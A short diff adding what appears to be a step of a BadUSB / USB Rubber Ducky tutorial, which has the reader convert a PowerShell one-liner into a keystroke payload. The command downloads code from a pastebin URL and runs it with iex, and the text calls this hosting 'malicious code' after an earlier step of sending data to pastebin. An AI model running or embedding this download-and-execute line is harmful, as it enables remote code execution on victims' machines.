@@ -1,0 +1,7 @@
+Well, we sent data to pastebin. But what if we used pastebin (or github) to host our malicious code?!
+Duckify this powershell command (it’s in from-pastebin.ps1) :
+iex((iwr http://pastebin.com/raw.php?i=sWacjDpa).content)
+
+But before you do. 
+PLEASE LOOK AT THE CODE AND UNDERSTAND IT!
+And make sure to always be vigilant
